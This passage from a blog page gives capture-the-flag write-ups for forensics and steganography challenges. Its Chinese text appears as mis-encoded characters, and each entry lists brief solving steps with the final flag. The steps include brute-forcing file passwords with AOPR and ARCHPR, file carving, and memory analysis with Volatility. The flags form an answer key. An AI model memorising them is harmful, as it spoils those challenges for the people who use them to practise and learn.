title="[SCTF2019]ç”µå•è½¦"></a>[SCTF2019]ç”µå•è½¦</h3><p>è¿™é¢˜æ˜¯çœŸçš„å°‘ä¿¡æ¯äº†ï¼ŒåŸæœ¬åº”è¯¥æœ‰ä¸ªé¢˜ç›®æè¿°çš„ã€‚è¦æ‰¾çš„æ˜¯ä¿¡å·çš„åœ°å€ä½çš„ 20bitã€‚ä½¿ç”¨ Audition è½¬å†™å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;01110100101010100110&#125;</span><br></pre></td></tr></table></figure><h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><p>010 editor æ‰“å¼€æ–‡ä»¶åè¡¥å…¨æ‹“å±•åã€‚ä½¿ç”¨ AOPR è¿›è¡Œå¯†ç çˆ†ç ´å¾—åˆ°å¯†ç ä¸º 9919ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899548540/ce9e7025d04d870e1ece5ac77e2d113da6a2656c.png" alt="image-20210128143859208"></p><p>å°è¯•åä¿®æ­£æ‹“å±•åä¸º pptï¼Œä½¿ç”¨ PowerPoint æ‰“å¼€æ–‡ä»¶ååœ¨å€’æ•°ç¬¬äºŒé¡µå¯æ‰¾åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#123;okYOUWIN&#125;</span><br></pre></td></tr></table></figure><h3 id="çœŸçš„å¾ˆæ‚"><a href="#çœŸçš„å¾ˆæ‚" class="headerlink" title="çœŸçš„å¾ˆæ‚"></a>çœŸçš„å¾ˆæ‚</h3><p><code>binwalk -e</code> åˆ†ç¦»å‡ºä¸€ä¸ª apk æ–‡ä»¶ï¼Œä½¿ç”¨ apktool åç¼–è¯‘æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899639491/af8b9bac515d9fc4e8bc144d0d2b29211bac2205.png"></p><p>æŸ¥çœ‹ MainActivity.smali å¯ä»¥çœ‹åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.line 32</span><br><span class="line">    .local v6, &quot;text&quot;:Landroid&#x2F;widget&#x2F;TextView;</span><br><span class="line">    const-string v0, &quot;flag&#123;25f991b27f&quot;</span><br><span class="line"></span><br><span class="line">    .line 33</span><br><span class="line">    .local v0, &quot;True1&quot;:Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">    const-string v1, &quot;c&quot;</span><br><span class="line"></span><br><span class="line">    .line 34</span><br><span class="line">    .local v1, &quot;True2&quot;:Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">    const-string v2, &quot;dc2f7a82a2b34&quot;</span><br><span class="line"></span><br><span class="line">    .line 35</span><br><span class="line">    .local v2, &quot;True3&quot;:Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">    const-string v3, &quot;3&quot;</span><br><span class="line"></span><br><span class="line">    .line 36</span><br><span class="line">    .local v3, &quot;True4&quot;:Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">    const-string v4, &quot;86e81c4&#125;&quot;</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥èµ·æ¥å³å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;25f991b27fcdc2f7a82a2b34386e81c4&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¹–å—çœèµ›2019-Findme"><a href="#æ¹–å—çœèµ›2019-Findme" class="headerlink" title="[æ¹–å—çœèµ›2019]Findme"></a>[æ¹–å—çœèµ›2019]Findme</h3><p>è§£å‹å¾—åˆ°äº”ä¸ªå›¾ç‰‡ï¼Œåˆ†åˆ«ä»äº”ä¸ªå›¾ç‰‡ä¸­å¾—åˆ° flag çš„ä¸€éƒ¨åˆ†ã€‚</p><p>åœ¨ç¬¬äºŒå¹…å›¾çš„æ–‡ä»¶å°¾éƒ¨æœ‰ä¸€ä¸ªå‹ç¼©æ–‡æ¡£ï¼Œæ–‡ä»¶å¤´ä»¥ 7z å¼€å¤´ï¼Œå¯æ˜¯ä¹‹åå´æ˜¯ <code>03 04</code> äºæ˜¯çŒœæµ‹å…¶å®æ˜¯ä¸ª zip æ–‡æ¡£ã€‚å°† 7z éƒ½æ›¿æ¢ä¸º PK ä»¥ä¿®æ­£æ–‡æ¡£ã€‚ä¿®æ­£ä¹‹åè§£å‹æ–‡æ¡£å¾—åˆ°ä¸€å †æ–‡æœ¬æ–‡æ¡£ï¼Œæ¨æµ‹æœ‰ç”¨çš„ä¿¡æ¯å¤§å°ä¸ä¸€æ ·ï¼Œäºæ˜¯å°†å…¶æŒ‰å¤§å°æ’åºï¼Œæ‰¾åˆ° 618.txtã€‚å…¶ä¸­åŒ…å«ä¿¡æ¯å¦‚ä¸‹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You find it: 1RVcmVfc</span><br></pre></td></tr></table></figure><p>ç¬¬äº”å¹…å›¾çš„å°¾éƒ¨æœ‰å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I give U a gift:Yzcllfc0lN</span><br></pre></td></tr></table></figure><p>ç¬¬å››å¹…å›¾çš„å°¾éƒ¨æœ‰å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">another part:cExlX1BsY</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å¹…å›¾ç”¨ 010 editor æ‰“å¼€çš„æ—¶å€™è¿è¡Œæ¨¡æ¿ä¼šå› ä¸º CRC ä¸åŒ¹é…æŠ¥é”™ï¼Œè€Œè¿™äº› CRC å€¼éƒ½åªæœ‰æœ€åä¸¤ä½ï¼Œå°†å…¶æå–å‡ºæ¥è½¬ ASCII çš„å¸¦å¦‚ä¸‹ä¿¡æ¯ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899682208/d6d9792d9fc144d063d5f3bfd79440649b16a843.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33 52 6C 5A 33 30 3D --&gt; 3RlZ30&#x3D;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å¹…å›¾æ‰“å¼€æ—¶å‘ç°äº† IDAT ç¼ºå¤±çš„æƒ…å†µï¼Œå°†å…¶è¡¥é½ä¿®æ­£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899724368/f273c690041bd928108abb9eccc3b6c8884ce614.png"></p><p>å†ä½¿ç”¨è„šæœ¬çˆ†ç ´å›¾ç‰‡å®½é«˜ï¼Œå¾—åˆ° <code>(&#39;hex:&#39;, &#39;0xe3&#39;, &#39;0x1c5&#39;)</code>ã€‚å°†å›¾ç‰‡å®½é«˜ä¿®æ­£ã€‚å†ä½¿ç”¨ StegSolve å¯è§£å‡ºä¸€ä¸ªäºŒç»´ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899760806/26d250eaac385d20f381028ee6c8b3961af1d528.png"></p><p>ä¿®æ­£å®šä½ç ä¹‹åæ‰«æå¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3s0X3</span><br></pre></td></tr></table></figure><p>å°†å†…å®¹ç‰‡æ®µæ‹¼æ¥ï¼Œbase64 è§£ç å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3s0X3Yzcllfc0lNcExlX1BsY1RVcmVfc3RlZ30&#x3D;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4_v3rY_sIMpLe_PlcTUre_steg&#125;</span><br></pre></td></tr></table></figure><h3 id="voip"><a href="#voip" class="headerlink" title="voip"></a>voip</h3><p>Wireshark ä½¿ç”¨ RTP åˆ†æ VoiP æµé‡åŒ…ï¼Œç›´æ¥å¯ä»¥å¬åˆ°ç”µè¯çš„éŸ³é¢‘ï¼Œä¸è¿‡æœ‰äº›éš¾å¬æ‡‚ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899805741/891443feb7f346025e3f85db5927a698e2431076.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccon&#123;9001IVR&#125;</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-zero"><a href="#UTCTF2020-zero" class="headerlink" title="[UTCTF2020]zero"></a>[UTCTF2020]zero</h3><p>æ‰“å¼€ä¹‹åæ˜¯ä¸€æ®µç¤ºä¾‹æ–‡å­—ï¼Œä½†æ˜¯æ–‡ä»¶çš„ç¼–ç æœ‰ç‚¹ä¸ä¸€æ ·ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899847498/61fd0a647b949fd34970235a843408926622496c.png"></p><p>æ ¹æ®é¢˜ç›®æš—ç¤ºï¼Œæ‰¾åˆ°<a href="https://330k.github.io/misc_tools/unicode_steganography.html">é›¶å®½å­—ç¬¦éšå†™</a>ï¼Œè§£å¾— flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899886251/2f91d96e5c9f0d03e5837a6b37e581b6f10270d5.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;whyNOT@sc11_4927aajbqk14&#125;</span><br></pre></td></tr></table></figure><h3 id="QCTF2018-X-man-A-face"><a href="#QCTF2018-X-man-A-face" class="headerlink" title="[QCTF2018]X-man-A face"></a>[QCTF2018]X-man-A face</h3><p>è§£å‹å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œä¸Šé¢æœ‰ä¸€ä¸ªæ®‹ç¼ºçš„äºŒç»´ç ï¼Œå°†å…¶å®šä½ç ä¿®æ­£ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899920810/eb10fee621a9b93eaa31e537160b3f9308586e15.jpg"></p><p>æ‰«æäºŒç»´ç ä¹‹åå¾—åˆ°ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œå°†å…¶ base32 è§£ç å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KFBVIRT3KBZGK5DUPFPVG2LTORSXEX2XNBXV6QTVPFZV6TLFL5GG6YTTORSXE7I&#x3D;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QCTF&#123;Pretty_Sister_Who_Buys_Me_Lobster&#125;</span><br></pre></td></tr></table></figure><h3 id="Business-Planning-Group"><a href="#Business-Planning-Group" class="headerlink" title="Business Planning Group"></a>Business Planning Group</h3><p>ä½¿ç”¨ 010 editor æ‰“å¼€å›¾ç‰‡å¯ä»¥å‘ç°æ–‡ä»¶å°¾å­˜åœ¨ bpg å›¾åƒï¼Œå°†å…¶åˆ†ç¦»å‡ºæ¥ã€‚ä½¿ç”¨<a href="https://webencoder.libbpg.org/show.html">åœ¨çº¿çš„å·¥å…·</a>å¯ä»¥å°†å…¶æ˜¾ç¤ºå¹¶ä¸‹è½½ä¸º png æ–‡ä»¶ã€‚<img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213899991881/ccbd0f85ffe704be906af6da08d28b502d744354.png"></p><p>å°†å›¾ç‰‡ä¸Šçš„æ–‡æœ¬æå–å‡ºæ¥å¹¶ base64 è§£ç å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bsides_delhi&#123;BPG_i5_b3tt3r_7h4n_JPG&#125;</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-pyFlag"><a href="#MRCTF2020-pyFlag" class="headerlink" title="[MRCTF2020]pyFlag"></a>[MRCTF2020]pyFlag</h3><p>å‹ç¼©åŒ…è§£å‹åä¸ºä¸‰å¼ å›¾ç‰‡ï¼Œä½¿ç”¨ 010 editor æ‰“å¼€å›¾ç‰‡å‘ç°æ¯å¼ å›¾ç‰‡çš„æœ€åéƒ½æœ‰ä¸€éƒ¨åˆ†ä¿¡æ¯ï¼Œå°†å…¶æ‹¼èµ·æ¥ä¹‹åå¾—åˆ°ä¸€ä¸ªå‹ç¼©æ–‡æ¡£ã€‚ä½¿ç”¨ ARCHPR çˆ†ç ´å‡ºå‹ç¼©åŒ…å¯†ç ä¸º 1234ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900030964/0746c4b74fee0a25ffbb6c72fd8830ca2f05aa6b.png"></p><p>è§£å‹æ–‡ä»¶åå¾—åˆ°åŠ å¯†çš„ flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">G&amp;eOhGcq(ZG(t2*H8M3dG&amp;wXiGcq(ZG&amp;wXyG(j~tG&amp;eOdGcq+aG(t5oG(j~qG&amp;eIeGcq+aG)6Q&lt;G(j~rG&amp;eOdH9&lt;5qG&amp;eLvG(j~sG&amp;nRdH9&lt;8rG%++qG%__eG&amp;eIeGc+|cG(t5oG(j~sG&amp;eOlH9&lt;8rH8C_qH9&lt;8oG&amp;eOhGc+_bG&amp;eLvH9&lt;8sG&amp;eLgGcz?cG&amp;3|sH8M3cG&amp;eOtG%_?aG(t5oG(j~tG&amp;wXxGcq+aH8V6sH9&lt;8rG&amp;eOhH9&lt;5qG(&lt;E-H8M3eG&amp;wXiGcq(ZG)6Q&lt;G(j~tG&amp;eOtG%+&lt;aG&amp;wagG%__cG&amp;eIeGcq+aG&amp;M9uH8V6cG&amp;eOlH9&lt;8rG(&lt;HrG(j~qG&amp;eLcH9&lt;8sG&amp;wUwGek2)</span><br></pre></td></tr></table></figure><p>å°†å…¶ç»è¿‡ <code>base85--&gt;From Hex--&gt;base32--&gt;From Hex--&gt;base64</code> çš„è§£ç ä¹‹åå³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900077524/753bf8affa3e66e421907d64490e7b3c60222354.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MRCTF&#123;Y0u_Are_4_p3rFect_dec0der&#125;</span><br></pre></td></tr></table></figure><h3 id="ACTFæ–°ç”Ÿèµ›2020-å‰‘é¾™"><a href="#ACTFæ–°ç”Ÿèµ›2020-å‰‘é¾™" class="headerlink" title="[ACTFæ–°ç”Ÿèµ›2020]å‰‘é¾™"></a>[ACTFæ–°ç”Ÿèµ›2020]å‰‘é¾™</h3><p>è§£å‹å¾—åˆ°å¾ˆå¤šæ–‡ä»¶ï¼Œpwd é‡Œæœ‰ä¸€æ®µ aaencode çš„ js ä»£ç ï¼Œè§£ç åå¾—åˆ° <code>welcom3!</code>ã€‚å°†å…¶ä½œä¸ºå¯†é’¥ç”¨ Steghide ä»å›¾ç‰‡ä¸­è§£å‡ºä¸€æ®µ DES å¯†æ–‡ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1&#x2F;7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj&#x2F;Q&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>ç»“åˆå›¾ç‰‡å¤‡æ³¨ä¸­çš„å¯†é’¥ <code>@#$%^&amp;%%$)</code> å¯ä»¥è§£å‡ºå¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">think about stegosaurus</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ Stegosaurus å·¥å…·å¯¹ O_O æ–‡ä»¶æå–æ•°æ®å°±èƒ½å¾—åˆ° flagã€‚å¯èƒ½æ˜¯æ–‡ä»¶æœ‰é—®é¢˜ï¼Œè¿™éƒ¨åˆ†æ²¡æœ‰å¤ç°åˆ°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3teg0Sauru3_!1&#125;</span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-soul-sipse"><a href="#GUET-CTF2019-soul-sipse" class="headerlink" title="[GUET-CTF2019]soul sipse"></a>[GUET-CTF2019]soul sipse</h3><p>å¯¹éŸ³é¢‘ Steghide è§£éšå†™è§£å‡ºä¸€ä¸ªæ–‡æœ¬ï¼Œå¾®äº‘ä¸‹è½½åçš„å¾—åˆ°ä¸€å¼ å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900116191/9fe8705b375c4a9434db508eed97f32d81529d80.png"></p><p>ä¿®å¤å›¾ç‰‡çš„æ–‡ä»¶å¤´ï¼Œå¹¶å°†å›¾ç‰‡ä¸Šçš„å†…å®¹è½¬ä¸ºæ–‡æœ¬ï¼Œå¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u0034\u0030\u0037\u0030\u000d\u000a\u0031\u0032\u0033\u0034\u000d\u000a</span><br></pre></td></tr></table></figure><p>Unescape Unicode Characters è§£ç å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4070</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><p>å°†è¿™ä¸¤è¡Œç›¸åŠ å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5304&#125;</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-spectogram"><a href="#UTCTF2020-spectogram" class="headerlink" title="[UTCTF2020]spectogram"></a>[UTCTF2020]spectogram</h3><p>éŸ³é¢‘æ–‡ä»¶ä½¿ç”¨ Audition æ‰“å¼€ï¼Œåœ¨é¢‘è°±éƒ¨åˆ†å¯ä»¥çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900172028/f5811b666a2478f4b3994279faefbcbb97c9a9f9.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uctflag&#123;sp3tr0gr4m0ph0n3&#125;</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-File-Carving"><a href="#UTCTF2020-File-Carving" class="headerlink" title="[UTCTF2020]File Carving"></a>[UTCTF2020]File Carving</h3><p>010 editor æ‰“å¼€æ–‡ä»¶å¯ä»¥å‘ç°æ–‡ä»¶å°¾éƒ¨æœ‰å‹ç¼©åŒ…ï¼Œåˆ†ç¦»å‡ºæ¥è§£å‹å¾—åˆ°ä¸€ä¸ª ELFã€‚IDA Pro æ‰“å¼€åç¼–è¯‘ä¸»ç¨‹åºå¯çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900214442/e070c2b85c8fc8fa3fabc9dacbe602fa9c473b87.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;2fbe9adc2ad89c71da48cabe90a121c0&#125;</span><br></pre></td></tr></table></figure><h3 id="RCTF2019-disk"><a href="#RCTF2019-disk" class="headerlink" title="[RCTF2019]disk"></a>[RCTF2019]disk</h3><p>ç”¨ 010 editor æ‰“å¼€åå¯ä»¥æ‰¾åˆ° flag çš„å‰åŠéƒ¨åˆ†ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900253409/da17ceea90e49c846458b930d35e04350df74231.png"></p><p>åˆ°è¿™é‡Œä¹‹åæœ¬é¢˜åˆå°‘ä¿¡æ¯äº†ï¼ŒåŸé¢˜ç»™äº† VeraCrypt çš„å¯†ç  <code>rctf</code>ã€‚è¿™é‡Œå…ˆç”¨ 7z å°† vmdk è§£å‹å¾—åˆ°ä¸€ä¸ª fat æ–‡ä»¶ã€‚å†ä½¿ç”¨ VeraCrypt åŠ è½½ã€‚æŒ‚è½½ç£ç›˜ä¹‹åå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Password 2: RCTF2019</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ–°çš„å¯†ç æŒ‚è½½ VeraCrypt çš„éšè—åˆ†åŒºã€‚æŒ‚è½½ä¹‹åä½¿ç”¨ WinHex è½½å…¥ç£ç›˜å¯ä»¥çœ‹åˆ°åä¸€åŠ flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900293847/0349fbbf4d26fbc30f812948ab13444c4d7b0b37.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rctf&#123;unseCure_quick_form4t_vo1umer_and_corrupted_1nner_v0lume&#125;</span><br></pre></td></tr></table></figure><h3 id="HDCTF2019-ä½ èƒ½å‘ç°ä»€ä¹ˆè››ä¸é©¬è¿¹å—"><a href="#HDCTF2019-ä½ èƒ½å‘ç°ä»€ä¹ˆè››ä¸é©¬è¿¹å—" class="headerlink" title="[HDCTF2019]ä½ èƒ½å‘ç°ä»€ä¹ˆè››ä¸é©¬è¿¹å—"></a>[HDCTF2019]ä½ èƒ½å‘ç°ä»€ä¹ˆè››ä¸é©¬è¿¹å—</h3><p>ä½¿ç”¨ Volatility2 è¿›è¡Œé•œåƒåˆ†æã€‚é¦–å…ˆ <code>imageinfo</code> ç¡®å®šä¸€ä¸‹ profileã€‚å‘ç°æ˜¯ <code>Win2003SP0x86, Win2003SP1x86, Win2003SP2x86</code>ï¼Œéšä¾¿é€‰ä¸€ä¸ªå¼€å§‹ <code>filescan | grep æ¡Œé¢</code> çœ‹ä¸€ä¸‹æ¡Œé¢çš„æ–‡ä»¶ï¼Œå‘ç°ä¸€ä¸ª flag.pngã€‚å°†å…¶æå–å‡ºæ¥ï¼Œæ‰«æå‘ç°æ˜¯ä¸€æ®µåŠ å¯†æ–‡æœ¬ï¼Œæ¥ç€å›å»æ‰¾å¯†é’¥ã€‚</p><p> <img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900327939/86fac65867a78a60fcb993a5ccf5b85e712a4632.png"></p><p>é¦–å…ˆ <code>pslist</code> ä¸€ä¸‹ï¼Œå‘ç°æ²¡æœ‰ notepad ç­‰å¯èƒ½è¯»å–æ–‡æœ¬æ–‡æ¡£çš„è¿›ç¨‹ï¼Œåªæœ‰ DumpIt.exe æ¯”è¾ƒå¯ç–‘ã€‚è€ƒè™‘åˆ°åœ¨æ¡Œé¢å‘ç°çš„å›¾ç‰‡ï¼Œå°†èµ„æºç®¡ç†å™¨çš„è¿›ç¨‹ä¸€èµ· dump ä¸‹æ¥ã€‚ä½¿ç”¨ binwalk åˆ†æå¯ä»¥å‘ç°èµ„æºç®¡ç†å™¨çš„ dumpfile é‡Œé¢æœ‰å¥½å‡ ä¸ªå›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900363058/462e144143272954110ac81fa3f925d4cb7dcd0e.png"></p><p>ä½¿ç”¨ foremost å°†å…¶åˆ†ç¦»å‡ºæ¥ï¼ŒæˆåŠŸå‘ç°åŒ…å«å¯†é’¥çš„å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900396348/980736a79a5f7dd4950559971167ec6a420696f4.png"></p><p>ä½¿ç”¨ AES å°†å¯†æ–‡è§£å¯†å³å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900441168/aec3956b128d8db6b076d8d2e743f1181f2bdc62.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</span><br></pre></td></tr></table></figure><h3 id="watevrCTF-2019-Evil-Cuteness"><a href="#watevrCTF-2019-Evil-Cuteness" class="headerlink" title="[watevrCTF 2019]Evil Cuteness"></a>[watevrCTF 2019]Evil Cuteness</h3><p>010 editor æ‰“å¼€å›¾ç‰‡å¯åœ¨æ–‡ä»¶å°¾éƒ¨å‘ç°å‹ç¼©æ–‡æ¡£ï¼Œåˆ†ç¦»å‡ºæ¥è§£å‹å³å¯å¾—åˆ° flag æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900478729/41075ef75b924f4d63393fec9e54a2f0abca5880.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watevr&#123;7h475_4c7u4lly_r34lly_cu73_7h0u6h&#125;</span><br></pre></td></tr></table></figure><h3 id="BSidesSF2019-table-tennis"><a href="#BSidesSF2019-table-tennis" class="headerlink" title="[BSidesSF2019]table-tennis"></a>[BSidesSF2019]table-tennis</h3><p>Wireshark æ‰“å¼€æµé‡åŒ…ï¼Œè·Ÿåˆ° ICMP æµé‡å¯ä»¥å‘ç° Data é‡Œé¢æœ‰ HTML æ–‡æ¡£çš„æ•°æ®ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900520133/c13454b9ab8f4c29c563deecc79d4e32794914c8.png"></p><p>ç­›é€‰ <code>frame.coloring_rule.string == &quot;icmp || icmpv6&quot;</code> å¯ä»¥çœ‹åˆ°æµé‡åŒ…ä¸­çš„ ICMP æµé‡ï¼Œè¯»æœ«å°¾çš„æ•°æ®å¯ä»¥å‘ç°å…³é”®æ•°æ®æ˜¯ä¸€æ®µ base64ï¼Œå°†å…¶å–å‡ºå base64 è§£ç å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;JustAS0ngAb0utP1ngP0ng&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2017-sanity"><a href="#INSHack2017-sanity" class="headerlink" title="[INSHack2017]sanity"></a>[INSHack2017]sanity</h3><p>Markdown æ–‡æ¡£ï¼Œæ‰“å¼€å³å¯çœ‹åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1613213900559756/8b6999cfef90a3af6323b2a94209b380d9fff87c.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;Youre_sane_Good_for_you&#125;</span><br></pre></td></tr></table></figure><h3 